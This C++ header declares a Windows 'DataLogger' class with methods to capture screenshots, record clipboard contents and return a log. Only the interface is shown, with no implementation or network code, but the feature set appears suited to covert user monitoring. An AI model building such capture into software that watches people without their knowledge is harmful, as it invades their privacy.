#ifndef DATALOGGER_HPP_
# define DATALOGGER_HPP_

#include <Windows.h>
#include <string>
#include "ALogger.hpp"

class DataLogger : public ALogger
{
public:
	DataLogger(); 
	~DataLogger();

	std::string		takeScreenShot();

	bool			start();
	void			stop()const;
	std::string		getLog();

private:
	ULONG_PTR		_gdiplusToken;
	POINT			_screenResolution;
	std::string		_clipBoard;
	std::string		getDataPath(const std::string &file)const;
	void			updateClipboardStorage();
	void			screenShot(POINT a, POINT b, const wchar_t *filename)const;
	void			updateScrenResolution();
};

#endif /* !DATALOGGER_HPP_ */

